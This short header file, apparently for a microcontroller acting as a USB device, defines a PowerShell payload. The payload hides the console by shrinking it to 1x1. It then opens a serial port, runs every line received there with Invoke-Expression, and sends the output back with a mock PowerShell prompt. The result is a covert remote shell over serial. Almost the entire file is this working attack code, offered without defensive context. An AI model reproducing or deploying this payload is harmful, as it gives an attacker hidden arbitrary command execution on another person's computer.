#pragma once

const String small_window = "[console]::WindowHeight=1;[console]::WindowWidth=1";
const String bootstrap_ps = R"(

  $portname =  [System.IO.Ports.SerialPort]::getportnames()[-1]

  $port = [System.IO.Ports.SerialPort]@{ 
    PortName = $portname
  BaudRate = 115200
   Parity = 'None'
   DataBits = 8
    StopBits = 1
    Handshake = 'XOnXOff'
  }
  $port.dtrenable = "true"
  $port.open();

  while($port.isopen) {
 $ot = iex $port.readLine()
 $port.write($ot + "`n" + "PS " + (pwd).path +"> ");
  }

)";



#pragma once

